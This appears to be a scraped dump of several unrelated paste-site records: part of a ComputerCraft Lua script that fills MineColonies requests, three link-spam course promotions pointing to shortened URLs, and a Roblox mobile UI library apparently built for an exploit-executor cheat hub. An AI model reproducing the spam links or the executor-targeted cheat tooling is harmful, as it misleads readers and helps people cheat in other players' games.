        cycle_color = colors.lightBlue
    elseif now >= 18 and now < 19.5 then
        cycle = ""sunset""
        cycle_color = colors.magenta
    elseif now >= 19.5 or now < 5 then
        cycle = ""night""
        cycle_color = colors.red
    end
 
    timer_color = colors.green
    if t < 15 then timer_color = colors.yellow end
    if t < 5 then timer_color = colors.orange end
 
    mPrintRowJustified(mon, 1, ""left"", string.format(""Time: %s [%s]    "", textutils.formatTime(now, false), cycle), cycle_color)
    if cycle ~= ""night"" then 
      mPrintRowJustified(mon, 1, ""right"", string.format(""    Remaining: %ss"", t), timer_color)
    else 
      mPrintRowJustified(mon, 1, ""right"", ""    Remaining: PAUSED"", colors.red)
    end
end

--[[
    Create Colonist Data
    @desc   Build a table of Colonist making the request
    @return table
]]
function createColonistData(colonist)
  title_words = {}
  words_in_name = 0
  colonist_job = """"
  word_count = 1
  
  for word in colonist:gmatch(""%S+"") do
    table.insert(title_words, word)
    words_in_name = words_in_name + 1
  end

  if words_in_name >= 3 then colonist_name = title_words[words_in_name-2] .. "" "" .. title_words[words_in_name]
  else colonist_name = colonist end

  repeat
    if colonist_job ~= """" then colonist_job = colonist_job .. "" "" end
    colonist_job = colonist_job .. title_words[word_count]
    word_count = word_count + 1
  until word_count > words_in_name - 3
  
  return  { fullName = colonist, titleWords = title_words, job = colonist_job, name = colonist_name, wordsInName = words_in_name }
end

--[[
    Get Work Request List (from colony)
    @desc   Build a table of the work request data from the colony
    @return table
]]
function getWorkRequestList(colony)
    requestList = {}
    workRequests = colony.getRequests()
    file = fs.open(logFile, ""w"")
    
    for w in pairs(workRequests) do
        writeToLog(workRequests[w], ""--- Request start ---"", ""--- Request end ---"");
        name = workRequests[w].name -- the name of the count/item being requested
        colonist = createColonistData(workRequests[w].target)
        desc = workRequests[w].desc -- the request description
        item = {}
        -- create the filter item for the transfer request through the bridge
        if workRequests[w].items and workRequests[w].items[1] then
          if not workRequests[w].items[1].nbt or table.empty(workRequests[w].items[1].nbt) then
            item = { name = workRequests[w].items[1].name, count =  workRequests[w].count, displayName = workRequests[w].items[1].displayName}
          else
            item = { name = workRequests[w].items[1].name, count = workRequests[w].count, displayName = workRequests[w].items[1].displayName, nbt =  workRequests[w].items[1].nbt}
          end
        end
        -- how many items are needed to fulfill this request?
        needed = workRequests[w].count

        local newRecord = {}
        newRecord.name = name
        newRecord.desc = desc
        newRecord.needed = needed
        newRecord.item = item
        newRecord.colonist = colonist
        table.insert(requestList, newRecord)
        writeToLog(newRecord, ""--- Record start ---"", ""--- Record end ---"");
      end
      file.close()
  return requestList
end

--[[
    Display List
    @desc   Update the monitor with the work request items currently in the system
    @return void
]]
function displayList(mon, listName, itemList)
  -- show the list header first
  mPrintRowJustified(mon, row, ""center"", listName, colors.white)
  row = row + 1
  for e in pairs(itemList) do
      record = itemList[e]
      text = string.format(""%d %s"", record.provided , record.name)
      mPrintRowJustified(mon, row, ""left"", text, record.color)
      mPrintRowJustified(mon, row, ""right"", "" "" .. record.colonist, record.color)
      row = row + 1
  end
  -- add a space at the end of the list
  row = row + 1
end

-- Color References:
-- RED:     work order can't be satisfied by Refined Storage (lack of pattern or lack of
--            required crafting ingredients).
-- YELLOW:  order partially filled and a crafting job was scheduled for the rest.
-- GREEN:   order fully filled.
-- BLUE:    the Player needs to manually fill the work order. This includes some equipment as well as generic requests ike Compostables, Fuel, Food, Flowers, etc.
--[[
    Scan Work Requests
    @desc   Manages all of the open work requests in the system and attempts to fulfill them from the inventory
    @desc   Not called at night (as determined by the server) since requests cannot be fulfilled anyway
    @return void
]]
function scanWorkRequests(mon, bridge, direction)
    
    print(""\nScan starting at"", textutils.formatTime(os.time(), false) .. "" ("" .. os.time() .."")."")
    builder_list = {}
    nonbuilder_list = {}
    equipment_list = {}
    requestList = getWorkRequestList(colony)
    
    for j, data in ipairs(requestList) do
        color = colors.blue
        provided = 0

        if processWorkRequestItem(data) then
            provided = bridge.exportItemToPeripheral(data.item, direction)
            color = colors.lightGray
            if provided >= data.needed then
              color = colors.green
            end
            -- only handle the Non-NBT data items or empty nbt table item records
            if provided < data.needed then
                if bridge.isItemCrafting(data.item) then
                    color = colors.yellow
                    print(""[Crafting]"", data.name)
                else
                    if bridge.craftItem(data.item) then
                      color = colors.yellow
                      print(""[Scheduled]"", data.item.count, ""x"", data.name)
                    else
                      color = colors.red
                      print(""[Failed]"", data.name)
                    end
                end
            end
        else 
           nameString = data.name .. "" ["" .. data.colonist.fullName .. ""]""
           print(""[Skipped]"", nameString)
        end
        -- ---------------------------------------------------------------------
        -- Build the newList data
        -- ---------------------------------------------------------------------
        -- create the target text
        expectedList = ""Builder""
        colonist = data.colonist.name
        if not string.find(data.colonist.fullName, ""Builder"") then
            expectedList = """"
            colonist = data.colonist.job .. "" "" .. data.colonist.name
            if data.colonist.wordsInName < 3 then
                colonist = data.colonist.name
            end
        end
          
        -- create the name
        listName = data.name
        if string.find(data.desc, ""level"") then
            expectedList = ""Equipment""
            level = ""Any Level""
            if string.find(data.desc, ""with maximal level: Leather"") then level = ""Leather"" end
            if string.find(data.desc, ""with maximal level: Gold"") then level = ""Gold"" end
            if string.find(data.desc, ""with maximal level: Chain"") then level = ""Chain"" end
            if string.find(data.desc, ""with maximal level: Wood or Gold"") then level = ""Wood or Gold"" end
            if string.find(data.desc, ""with maximal level: Stone"") then level = ""Stone"" end
            if string.find(data.desc, ""with maximal level: Iron"") then level = ""Iron"" end
            if string.find(data.desc, ""with maximal level: Diamond"") then level = ""Diamond"" end
            listName = level .. "" "" .. data.name
            if level == ""Any Level"" then listName = data.name .. "" of any level"" end
        end
          
        -- create the new list table defining what is inserted into a specific list
        newList = { name=listName, colonist=colonist, needed=data.needed, provided=provided, color=color}
        
        if expectedList == ""Equipment"" then
            table.insert(equipment_list, newList)
        elseif expectedList == ""Builder"" then
            table.insert(builder_list, newList)
        else
            table.insert(nonbuilder_list, newList)
        end
        -- ---------------------------------------------------------------------
    end

  -- Show the various lists on the attached monitor.
  mon.clear()
  row = 3
  if not table.empty(builder_list) then displayList(mon, ""Builder Requests"", builder_list) end
  if not table.empty(nonbuilder_list) then displayList(mon, ""Nonbuilder Requests"", nonbuilder_list) end
  if not table.empty(equipment_list) then displayList(mon, ""Equipment"", equipment_list) end

  -- no requests
  if row == 3 then 
    mPrintRowJustified(mon, row, ""center"", ""No Open Requests"", colors.white)
  end
  print(""Scan completed at"", textutils.formatTime(os.time(), false) .. "" ("" .. os.time() .."")."") 
end


--[[
    MAIN
    @desc   establish the run times and execute the work request management
    @return void
]]
local current_run = time_between_runs
scanWorkRequests(monitor, bridge, direction)
displayTimer(monitor, current_run)
local TIMER = os.startTimer(1)

while true do
  local e = {os.pullEvent()}
  if e[1] == ""timer"" and e[2] == TIMER then
    now = os.time()
    if now >= 5 and now < 19.5 then
      current_run = current_run - 1
      if current_run <= 0 then
        scanWorkRequests(monitor, bridge, direction)
        current_run = time_between_runs
      end
    end
    displayTimer(monitor, current_run)
    TIMER = os.startTimer(1)
  elseif e[1] == ""monitor_touch"" then
    os.cancelTimer(TIMER)
    scanWorkRequests(monitor, bridge, direction)
    current_run = time_between_runs
    displayTimer(monitor, current_run)
    TIMER = os.startTimer(1)
  end
end"
LR84A88a,Is PHP worth learning in 2024 for web?,f0f077,PHP,Monday 14th of April 2025 04:10:20 PM CDT,"Is PHP worth learning in 2024 for web?
## Is PHP Worth Learning in 2024 for Web Development?
Is PHP still relevant in today's tech world?  The answer is a resounding yes!  PHP is still going strong and definitely worth learning.  
One of the biggest reasons for its continued popularity is WordPress.  WordPress is a powerful website platform that powers millions of websites, and it's built on PHP.  Since WordPress isn't going anywhere anytime soon, PHP will continue to be a valuable skill.  
for more:https://short-jambo.ink/EwAZ"
TneSi6n8,Master Python Fundamentals - The Ultimate Python Course for Beginners,f0f077,Python,Monday 14th of April 2025 03:55:17 PM CDT,"Master Python Fundamentals - The Ultimate Python Course for Beginners

""Master Python Fundamentals"" is a great course for people who want to learn how to code with Python. It teaches you the basics of Python, like how to use numbers, words, and lists. You'll also learn how to make your own programs that can do things like draw pictures. The course is broken down into lots of small lessons, so you can learn at your own pace.
You'll learn how to make programs that can do things like draw pictures, play games, and even help you with your homework. 
for more:https://short-jambo.ink/sXKQF"
B8eRJhuE,"Python Mastery: 100 Days, 100 Projects",f0f077,Python,Monday 14th of April 2025 03:31:00 PM CDT,"Python Mastery: 100 Days, 100 Projects
""100 Days of Python"" is a fun way to learn how to code. It's a course where you build 100 different projects in 100 days. People all over the world are using this method to learn Python. Python is a computer language that is used to make websites, video games, and even robots.
In this course, you will start with the basics, like variables and loops. Then, you'll learn more difficult things, like how to make apps with buttons and text. You'll also learn how to make websites and work with data. Each day, you learn something new and then use it to build a project. Some projects are simple, like a timer. Others are more difficult, like a chatbot that uses AI.
for more:https://short-jambo.ink/L0WAz"
MbQwp9qG,Untitled,grefdgvfdsgfdgd,Lua,Monday 14th of April 2025 03:30:25 PM CDT,"-- kali mobile take if u want ??

local MobileUI = {}
local Players = game:GetService(""Players"")
local UserInputService = game:GetService(""UserInputService"")
local RunService = game:GetService(""RunService"")
local TweenService = game:GetService(""TweenService"")
local LocalPlayer = Players.LocalPlayer
local GuiService = game:GetService(""GuiService"")

-- cfgs
MobileUI.Config = {
    MainColor = Color3.fromRGB(25, 25, 35),
    AccentColor = Color3.fromRGB(65, 105, 225),
    TextColor = Color3.fromRGB(255, 255, 255),
    ButtonColor = Color3.fromRGB(45, 45, 55),
    ButtonHoverColor = Color3.fromRGB(55, 55, 65),
    ToggleOnColor = Color3.fromRGB(65, 105, 225),
    ToggleOffColor = Color3.fromRGB(45, 45, 55),
    SliderColor = Color3.fromRGB(65, 105, 225),
    SliderBackgroundColor = Color3.fromRGB(35, 35, 45),
    Transparency = 0.1,
    ButtonSize = UDim2.new(0, 60, 0, 60),
    CornerRadius = UDim.new(0, 8),
    FontSize = Enum.FontSize.Size14,
    Font = Enum.Font.GothamBold,
    Padding = 10,
    AnimationSpeed = 0.15
}

-- varibles
MobileUI.ScreenGui = nil
MobileUI.MainFrame = nil
MobileUI.MenuFrame = nil
MobileUI.ButtonsFrame = nil
MobileUI.ActiveButtons = {}
MobileUI.DraggableButtons = {}
MobileUI.IsDraggingButtons = false

-- mobile ya
local function createCorner(parent)
    local corner = Instance.new(""UICorner"")
    corner.CornerRadius = MobileUI.Config.CornerRadius
    corner.Parent = parent
    return corner
end

local function createStroke(parent, color, thickness)
    local stroke = Instance.new(""UIStroke"")
    stroke.Color = color or Color3.fromRGB(65, 105, 225)
    stroke.Thickness = thickness or 1
    stroke.Parent = parent
    return stroke
end

local function createShadow(parent)
    local shadow = Instance.new(""ImageLabel"")
    shadow.AnchorPoint = Vector2.new(0.5, 0.5)
    shadow.BackgroundTransparency = 1
    shadow.Position = UDim2.new(0.5, 0, 0.5, 0)
    shadow.Size = UDim2.new(1, 10, 1, 10)
    shadow.ZIndex = parent.ZIndex - 1
    shadow.Image = ""rbxassetid://7912134082""
    shadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
    shadow.ImageTransparency = 0.6
    shadow.ScaleType = Enum.ScaleType.Slice
    shadow.SliceCenter = Rect.new(95, 95, 205, 205)
    shadow.Parent = parent
    return shadow
end

local function createRipple(parent)
    local ripple = Instance.new(""Frame"")
    ripple.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    ripple.BackgroundTransparency = 0.8
    ripple.BorderSizePixel = 0
    ripple.AnchorPoint = Vector2.new(0.5, 0.5)
    ripple.Position = UDim2.new(0.5, 0, 0.5, 0)
    ripple.Size = UDim2.new(0, 0, 0, 0)
    ripple.ZIndex = parent.ZIndex + 1
    createCorner(ripple)
    ripple.Parent = parent
    
    local targetSize = UDim2.new(1.5, 0, 1.5, 0)
    local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
    local tween = TweenService:Create(ripple, tweenInfo, {Size = targetSize, BackgroundTransparency = 1})
    tween:Play()
    
    tween.Completed:Connect(function()
        ripple:Destroy()
    end)
end

-- Make an element draggable
function MobileUI:MakeDraggable(element, dragHandle)
    local dragging = false
    local dragInput
    local dragStart
    local startPos
    
    local function updateDrag(input)
        local delta = input.Position - dragStart
        element.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end
    
    dragHandle = dragHandle or element
    
    dragHandle.InputBegan:Connect(function(input)
        if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then
            dragging = true
            dragStart = input.Position
            startPos = element.Position
            
            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then
                    dragging = false
                end
            end)
        end
    end)
    
    dragHandle.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
            dragInput = input
        end
    end)
    
    UserInputService.InputChanged:Connect(function(input)
        if input == dragInput and dragging then
            updateDrag(input)
        end
    end)
end

-- Initialize UI
function MobileUI:Init(title)
    if MobileUI.ScreenGui then MobileUI.ScreenGui:Destroy() end
    
    -- Create ScreenGui
    MobileUI.ScreenGui = Instance.new(""ScreenGui"")
    MobileUI.ScreenGui.Name = ""MobileUILib""
    MobileUI.ScreenGui.ResetOnSpawn = false
    MobileUI.ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    
    -- Handle different display sizes
    local viewportSize = workspace.CurrentCamera.ViewportSize
    local isPortrait = viewportSize.Y > viewportSize.X
    local scale = math.min(viewportSize.X, viewportSize.Y) / 1080
    local buttonSize = UDim2.new(0, math.floor(MobileUI.Config.ButtonSize.X.Offset * scale), 
                                0, math.floor(MobileUI.Config.ButtonSize.Y.Offset * scale))
    
    -- Adjust for mobile devices
    local isMobile = UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled
    if isMobile then
        -- Account for notches and safe areas on mobile
        local insets = GuiService:GetGuiInset()
        MobileUI.Config.TopInset = insets.Y
    else
        MobileUI.Config.TopInset = 0
    end
    
    -- Create main container
    MobileUI.MainFrame = Instance.new(""Frame"")
    MobileUI.MainFrame.Name = ""MainContainer""
    MobileUI.MainFrame.BackgroundTransparency = 1
    MobileUI.MainFrame.Size = UDim2.new(1, 0, 1, 0)
    MobileUI.MainFrame.Parent = MobileUI.ScreenGui
    
    -- Create menu button (hamburger)
    local menuButton = Instance.new(""ImageButton"")
    menuButton.Name = ""MenuButton""
    menuButton.BackgroundColor3 = MobileUI.Config.MainColor
    menuButton.BackgroundTransparency = MobileUI.Config.Transparency
    menuButton.Position = UDim2.new(0, 10, 0, 10 + MobileUI.Config.TopInset)
    menuButton.Size = UDim2.new(0, 50, 0, 50)
    menuButton.Image = ""rbxassetid://7059346373"" -- Hamburger menu icon
    menuButton.ImageColor3 = MobileUI.Config.TextColor
    menuButton.Parent = MobileUI.MainFrame
    createCorner(menuButton)
    createShadow(menuButton)
    
    -- Create menu frame
    MobileUI.MenuFrame = Instance.new(""Frame"")
    MobileUI.MenuFrame.Name = ""MenuFrame""
    MobileUI.MenuFrame.BackgroundColor3 = MobileUI.Config.MainColor
    MobileUI.MenuFrame.BackgroundTransparency = MobileUI.Config.Transparency
    MobileUI.MenuFrame.Position = UDim2.new(0, 10, 0, 70 + MobileUI.Config.TopInset)
    MobileUI.MenuFrame.Size = UDim2.new(0, 250, 0, 400)
    MobileUI.MenuFrame.ClipsDescendants = true
    MobileUI.MenuFrame.Parent = MobileUI.MainFrame
    createCorner(MobileUI.MenuFrame)
    createShadow(MobileUI.MenuFrame)
    
    -- Create title
    local titleLabel = Instance.new(""TextLabel"")
    titleLabel.Name = ""TitleLabel""
    titleLabel.BackgroundTransparency = 1
    titleLabel.Position = UDim2.new(0, 10, 0, 10)
    titleLabel.Size = UDim2.new(1, -20, 0, 30)
    titleLabel.Font = MobileUI.Config.Font
    titleLabel.Text = title or ""Kali Hub | Mobile""
    titleLabel.TextColor3 = MobileUI.Config.TextColor
    titleLabel.TextSize = 18
    titleLabel.TextXAlignment = Enum.TextXAlignment.Left
    titleLabel.Parent = MobileUI.MenuFrame
    
    -- Create divider
    local divider = Instance.new(""Frame"")
    divider.Name = ""Divider""
    divider.BackgroundColor3 = MobileUI.Config.AccentColor
    divider.BorderSizePixel = 0
    divider.Position = UDim2.new(0, 10, 0, 50)
    divider.Size = UDim2.new(1, -20, 0, 2)
    divider.Parent = MobileUI.MenuFrame
    
    -- Create scroll frame for menu items
    local scrollFrame = Instance.new(""ScrollingFrame"")
    scrollFrame.Name = ""ScrollFrame""
    scrollFrame.BackgroundTransparency = 1
    scrollFrame.Position = UDim2.new(0, 5, 0, 60)
    scrollFrame.Size = UDim2.new(1, -10, 1, -70)
    scrollFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
    scrollFrame.ScrollBarThickness = 4
    scrollFrame.ScrollBarImageColor3 = MobileUI.Config.AccentColor
    scrollFrame.Parent = MobileUI.MenuFrame
    
    -- Create UIListLayout for menu items
    local listLayout = Instance.new(""UIListLayout"")
    listLayout.Padding = UDim.new(0, 5)
    listLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
    listLayout.SortOrder = Enum.SortOrder.LayoutOrder
    listLayout.Parent = scrollFrame
    
    -- Create padding
    local padding = Instance.new(""UIPadding"")
    padding.PaddingTop = UDim.new(0, 5)
    padding.PaddingBottom = UDim.new(0, 5)
    padding.PaddingLeft = UDim.new(0, 5)
    padding.PaddingRight = UDim.new(0, 5)
    padding.Parent = scrollFrame
    
    -- Create buttons container
    MobileUI.ButtonsFrame = Instance.new(""Frame"")
    MobileUI.ButtonsFrame.Name = ""ButtonsFrame""
    MobileUI.ButtonsFrame.BackgroundTransparency = 1
    MobileUI.ButtonsFrame.Position = UDim2.new(1, -70, 0, 100 + MobileUI.Config.TopInset)
    MobileUI.ButtonsFrame.Size = UDim2.new(0, 60, 0, 300)
    MobileUI.ButtonsFrame.Parent = MobileUI.MainFrame
    
    -- Create UIListLayout for buttons
    local buttonLayout = Instance.new(""UIListLayout"")
    buttonLayout.Padding = UDim.new(0, 10)
    buttonLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
    buttonLayout.SortOrder = Enum.SortOrder.LayoutOrder
    buttonLayout.Parent = MobileUI.ButtonsFrame
    
    -- Menu toggle functionality
    local menuOpen = true
    menuButton.MouseButton1Click:Connect(function()
        createRipple(menuButton)
        menuOpen = not menuOpen
        local targetPos = menuOpen and UDim2.new(0, 10, 0, 70 + MobileUI.Config.TopInset) or UDim2.new(-1, -250, 0, 70 + MobileUI.Config.TopInset)
        local tweenInfo = TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
        local tween = TweenService:Create(MobileUI.MenuFrame, tweenInfo, {Position = targetPos})
        tween:Play()
    end)
    
    -- Make menu draggable
    MobileUI:MakeDraggable(MobileUI.MenuFrame, titleLabel)
    
    -- Auto-adjust canvas size
    listLayout:GetPropertyChangedSignal(""AbsoluteContentSize""):Connect(function()
        scrollFrame.CanvasSize = UDim2.new(0, 0, 0, listLayout.AbsoluteContentSize.Y + 10)
    end)
    
    -- Auto-adjust buttons frame size
    buttonLayout:GetPropertyChangedSignal(""AbsoluteContentSize""):Connect(function()
        MobileUI.ButtonsFrame.Size = UDim2.new(0, 60, 0, buttonLayout.AbsoluteContentSize.Y)
    end)
    
    -- Parent the ScreenGui
    MobileUI.ScreenGui.Parent = (syn and syn.protect_gui) and gethui() or game:GetService(""CoreGui"")
    
    return scrollFrame
end

-- Create a section in the menu
function MobileUI:CreateSection(scrollFrame, title)
    local sectionFrame = Instance.new(""Frame"")
    sectionFrame.Name = title .. ""Section""
    sectionFrame.BackgroundColor3 = MobileUI.Config.ButtonColor
    sectionFrame.BackgroundTransparency = 0.5
    sectionFrame.Size = UDim2.new(1, -10, 0, 30)
    sectionFrame.Parent = scrollFrame
    createCorner(sectionFrame)
    
    local sectionLabel = Instance.new(""TextLabel"")
    sectionLabel.Name = ""SectionLabel""
    sectionLabel.BackgroundTransparency = 1
    sectionLabel.Size = UDim2.new(1, 0, 1, 0)
    sectionLabel.Font = MobileUI.Config.Font
    sectionLabel.Text = title
    sectionLabel.TextColor3 = MobileUI.Config.TextColor
    sectionLabel.TextSize = 14
    sectionLabel.Parent = sectionFrame
    
    return sectionFrame
end

-- Create a toggle button in the menu
function MobileUI:CreateToggle(scrollFrame, name, defaultValue, callback)
    local toggleFrame = Instance.new(""Frame"")
    toggleFrame.Name = name .. ""Toggle""
    toggleFrame.BackgroundColor3 = MobileUI.Config.ButtonColor
    toggleFrame.BackgroundTransparency = 0.3
    toggleFrame.Size = UDim2.new(1, -10, 0, 40)
    toggleFrame.Parent = scrollFrame
    createCorner(toggleFrame)
    
    local toggleLabel = Instance.new(""TextLabel"")
    toggleLabel.Name = ""ToggleLabel""
    toggleLabel.BackgroundTransparency = 1
    toggleLabel.Position = UDim2.new(0, 10, 0, 0)
    toggleLabel.Size = UDim2.new(1, -60, 1, 0)
    toggleLabel.Font = MobileUI.Config.Font
    toggleLabel.Text = name
    toggleLabel.TextColor3 = MobileUI.Config.TextColor
    toggleLabel.TextSize = 14
    toggleLabel.TextXAlignment = Enum.TextXAlignment.Left
    toggleLabel.Parent = toggleFrame
    
    local toggleButton = Instance.new(""Frame"")
    toggleButton.Name = ""ToggleButton""
    toggleButton.BackgroundColor3 = defaultValue and MobileUI.Config.ToggleOnColor or MobileUI.Config.ToggleOffColor
    toggleButton.Position = UDim2.new(1, -50, 0.5, -10)
    toggleButton.Size = UDim2.new(0, 40, 0, 20)
    toggleButton.Parent = toggleFrame
    createCorner(toggleButton)
    
    local toggleCircle = Instance.new(""Frame"")
    toggleCircle.Name = ""ToggleCircle""
    toggleCircle.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    toggleCircle.Position = defaultValue and UDim2.new(1, -18, 0.5, -8) or UDim2.new(0, 2, 0.5, -8)
    toggleCircle.Size = UDim2.new(0, 16, 0, 16)
    toggleCircle.Parent = toggleButton
    createCorner(toggleCircle)
    
    local toggleValue = defaultValue or false
    
    local function updateToggle()
        toggleValue = not toggleValue
        local targetPos = toggleValue and UDim2.new(1, -18, 0.5, -8) or UDim2.new(0, 2, 0.5, -8)
        local targetColor = toggleValue and MobileUI.Config.ToggleOnColor or MobileUI.Config.ToggleOffColor
        
        local circleTween = TweenService:Create(toggleCircle, TweenInfo.new(0.2), {Position = targetPos})
        local colorTween = TweenService:Create(toggleButton, TweenInfo.new(0.2), {BackgroundColor3 = targetColor})
        
        circleTween:Play()
        colorTween:Play()
        
        if callback then callback(toggleValue) end
    end
    
    toggleFrame.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            createRipple(toggleFrame)
            updateToggle()
        end
    end)
    
    return {
        Frame = toggleFrame,
        SetValue = function(value)
            if toggleValue ~= value then
                updateToggle()
            end
        end,
        GetValue = function()
            return toggleValue
        end
    }
end

-- Create a slider in the menu
function MobileUI:CreateSlider(scrollFrame, name, min, max, defaultValue, suffix, callback)
    local sliderFrame = Instance.new(""Frame"")
    sliderFrame.Name = name .. ""Slider""
    sliderFrame.BackgroundColor3 = MobileUI.Config.ButtonColor
    sliderFrame.BackgroundTransparency = 0.3
    sliderFrame.Size = UDim2.new(1, -10, 0, 60)
    sliderFrame.Parent = scrollFrame
    createCorner(sliderFrame)
    
    local sliderLabel = Instance.new(""TextLabel"")
    sliderLabel.Name = ""SliderLabel""
    sliderLabel.BackgroundTransparency = 1
    sliderLabel.Position = UDim2.new(0, 10, 0, 5)
    sliderLabel.Size = UDim2.new(1, -20, 0, 20)
    sliderLabel.Font = MobileUI.Config.Font
    sliderLabel.Text = name
    sliderLabel.TextColor3 = MobileUI.Config.TextColor
    sliderLabel.TextSize = 14
    sliderLabel.TextXAlignment = Enum.TextXAlignment.Left
    sliderLabel.Parent = sliderFrame
    
    local valueLabel = Instance.new(""TextLabel"")
    valueLabel.Name = ""ValueLabel""
    valueLabel.BackgroundTransparency = 1
    valueLabel.Position = UDim2.new(1, -50, 0, 5)
    valueLabel.Size = UDim2.new(0, 40, 0, 20)
    valueLabel.Font = MobileUI.Config.Font
    valueLabel.Text = tostring(defaultValue) .. (suffix and "" "" .. suffix or """")
    valueLabel.TextColor3 = MobileUI.Config.TextColor
    valueLabel.TextSize = 14
    valueLabel.TextXAlignment = Enum.TextXAlignment.Right
    valueLabel.Parent = sliderFrame
    
    local sliderBackground = Instance.new(""Frame"")
    sliderBackground.Name = ""SliderBackground""
    sliderBackground.BackgroundColor3 = MobileUI.Config.SliderBackgroundColor
    sliderBackground.Position = UDim2.new(0, 10, 0, 35)
    sliderBackground.Size = UDim2.new(1, -20, 0, 10)
    sliderBackground.Parent = sliderFrame
    createCorner(sliderBackground)
    
    local sliderFill = Instance.new(""Frame"")
    sliderFill.Name = ""SliderFill""
    sliderFill.BackgroundColor3 = MobileUI.Config.SliderColor
    sliderFill.Size = UDim2.new((defaultValue - min) / (max - min), 0, 1, 0)
    sliderFill.Parent = sliderBackground
    createCorner(sliderFill)
    
    local sliderKnob = Instance.new(""Frame"")
    sliderKnob.Name = ""SliderKnob""
    sliderKnob.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    sliderKnob.Position = UDim2.new((defaultValue - min) / (max - min), 0, 0.5, -10)
    sliderKnob.Size = UDim2.new(0, 20, 0, 20)
    sliderKnob.ZIndex = 2
    sliderKnob.Parent = sliderBackground
    createCorner(sliderKnob)
    createShadow(sliderKnob)
    
    local currentValue = defaultValue
    
    local function updateSlider(input)
        local pos = input.Position.X
        local relativePos = math.clamp((pos - sliderBackground.AbsolutePosition.X) / sliderBackground.AbsoluteSize.X, 0, 1)
        local value = min + (max - min) * relativePos
        
        -- Round to increment if needed
        value = math.floor(value * 100) / 100
        
        currentValue = value
        valueLabel.Text = tostring(value) .. (suffix and "" "" .. suffix or """")
        
        sliderFill.Size = UDim2.new(relativePos, 0, 1, 0)
        sliderKnob.Position = UDim2.new(relativePos, 0, 0.5, -10)
        
        if callback then callback(value) end
    end
    
    local sliding = false
    
    sliderBackground.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            sliding = true
            updateSlider(input)
        end
    end)
    
    sliderKnob.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            sliding = true
        end
    end)
    
    UserInputService.InputEnded:Connect(function(input)
        if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) and sliding then
            sliding = false
        end
    end)
    
    UserInputService.InputChanged:Connect(function(input)
        if sliding and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
            updateSlider(input)
        end
    end)
    
    return {
        Frame = sliderFrame,
        SetValue = function(value)
            value = math.clamp(value, min, max)
            currentValue = value
            valueLabel.Text = tostring(value) .. (suffix and "" "" .. suffix or """")
            
            local relativePos = (value - min) / (max - min)
            sliderFill.Size = UDim2.new(relativePos, 0, 1, 0)
            sliderKnob.Position = UDim2.new(relativePos, 0, 0.5, -10)
            
            if callback then callback(value) end
        end,
        GetValue = function()
            return currentValue
        end
    }
end

-- Create a button in the menu
function MobileUI:CreateButton(scrollFrame, name, callback)
    local buttonFrame = Instance.new(""Frame"")
    buttonFrame.Name = name .. ""Button""
    buttonFrame.BackgroundColor3 = MobileUI.Config.ButtonColor
    buttonFrame.BackgroundTransparency = 0.3
    buttonFrame.Size = UDim2.new(1, -10, 0, 40)
    buttonFrame.Parent = scrollFrame
    createCorner(buttonFrame)
    
    local buttonLabel = Instance.new(""TextLabel"")
    buttonLabel.Name = ""ButtonLabel""
    buttonLabel.BackgroundTransparency = 1
    buttonLabel.Size = UDim2.new(1, 0, 1, 0)
    buttonLabel.Font = MobileUI.Config.Font
    buttonLabel.Text = name
    buttonLabel.TextColor3 = MobileUI.Config.TextColor
    buttonLabel.TextSize = 14
    buttonLabel.Parent = buttonFrame
    
    buttonFrame.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            createRipple(buttonFrame)
            if callback then callback() end
        end
    end)
    
    return buttonFrame
end

-- Create a mobile action button
function MobileUI:CreateMobileButton(name, icon, position, callback, holdCallback)
    local button = Instance.new(""ImageButton"")
    button.Name = name .. ""MobileButton""
    button.BackgroundColor3 = MobileUI.Config.ButtonColor
    button.BackgroundTransparency = 0.3
    button.Size = UDim2.new(0, 70, 0, 70)
    button.Position = position or UDim2.new(0.9, -35, 0.7, -35)
    button.Image = icon or """"
    button.ImageColor3 = MobileUI.Config.TextColor
    button.Parent = MobileUI.MainFrame
    createCorner(button)
    createShadow(button)
    
    -- Add label
    local label = Instance.new(""TextLabel"")
    label.Name = ""ButtonLabel""
    label.BackgroundTransparency = 1
    label.Position = UDim2.new(0, 0, 0, -25)
    label.Size = UDim2.new(1, 0, 0, 20)
    label.Font = MobileUI.Config.Font
    label.Text = name
    label.TextColor3 = MobileUI.Config.TextColor
    label.TextSize = 12
    label.Parent = button
    
    local isHolding = false
    local holdThread = nil
    
    button.MouseButton1Down:Connect(function()
        createRipple(button)
        isHolding = true
        
        if holdCallback then
            holdThread = task.spawn(function()
                while isHolding do
                    holdCallback()
                    task.wait(0.05)
                end
            end)
        else
            if callback then callback() end
        end
    end)
    
    button.MouseButton1Up:Connect(function()
        isHolding = false
        if holdThread then
            task.cancel(holdThread)
            holdThread = nil
        end
    end)
    
    -- For touch screens
    button.TouchLongPress:Connect(function()
        if not isHolding and holdCallback then
            isHolding = true
